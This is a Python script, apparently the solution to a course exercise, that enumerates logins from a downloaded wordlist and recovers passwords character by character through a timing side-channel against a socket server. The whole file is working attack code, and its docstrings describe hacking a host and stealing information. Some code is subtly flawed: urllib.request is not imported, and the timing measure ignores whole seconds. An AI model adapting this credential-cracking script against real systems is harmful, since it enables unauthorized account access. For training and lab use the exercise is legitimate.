import argparse
import itertools
import json
import socket
import string
import datetime
import typing
import urllib


def possible_parameter(my_url: str) -> typing.Generator[str, any, None]:
    """
    This generator yield all possible password.
    Returns: typing.Generator[str, any, None]

    Parameters
    ----------
    my_url: str: Name of file with password.

    Returns
    -------
    typing.Generator[str, any, None]: Potential passwords
    """

    with urllib.request.urlopen(my_url) as parameter_dictionary:
        for line in (parameter_dictionary.read().decode("UTF-8")).split("\r\n"):
            baby_parameter = line.strip()
            permutations = itertools.product(*zip(baby_parameter.upper(), baby_parameter.lower()))
            parameter_candidate = list(map("".join, permutations))
            for parameter in parameter_candidate:
                output_parameter = parameter
                yield output_parameter


def hack_connection(ip_address: str, port_number: str, url_login: str) -> None:
    """
    Print the correct password needed to stealing.
    Returns: None.

    Parameters
    ----------
    ip_address: str: hosting that we want to hack.
    port_number: str: port used to steal information.
    url_login: url of text file with possible logins.

    Returns
    -------
    None
    """
    my_login_generator = possible_parameter(url_login)
    key = iter(list(string.ascii_letters + string.digits + string.punctuation))
    initial_login = next(my_login_generator)
    password = ""
    character = next(key)
    message = {"login": initial_login, "password": password + character}
    try:
        with socket.socket() as my_sock:
            my_sock.connect((ip_address, int(port_number)))
            while True:
                start = datetime.datetime.now()
                my_sock.send(json.dumps(message).encode(encoding="UTF-8"))
                response = my_sock.recv(1024)
                end = datetime.datetime.now()
                elapsed_time = (end - start).microseconds
                try:
                    if json.loads(response.decode(encoding="UTF-8"))["result"] == "Wrong login!":
                        initial_login = next(my_login_generator)
                    elif json.loads(response.decode(encoding="UTF-8"))["result"] == "Wrong password!" and elapsed_time < 90000:
                        character = next(key)
                    elif json.loads(response.decode(encoding="UTF-8"))["result"] == "Wrong password!" and elapsed_time >= 90000:
                        key = iter(list(string.ascii_letters + string.digits + string.punctuation))
                        password += character
                    else:
                        break
                    message = {"login": initial_login, "password": password + character}
                except StopIteration:
                    break
            print(json.dumps(message))
            my_sock.close()
    except ConnectionAbortedError:
        pass
    except ConnectionRefusedError:
        pass
    except ConnectionError:
        pass


def main() -> None:
    """
    main function for script.

    Returns
    -------

    """
    url_login = "https://stepik.org/media/attachments/lesson/255258/logins.txt"
    url_password = "https://stepik.org/media/attachments/lesson/255258/passwords.txt"
    parser = argparse.ArgumentParser("")
    for str_ in ["host", "port"]:
        parser.add_argument(str_)
    args = parser.parse_args()
    hack_connection(args.host, args.port, url_login)


if __name__ == "__main__":
    main()
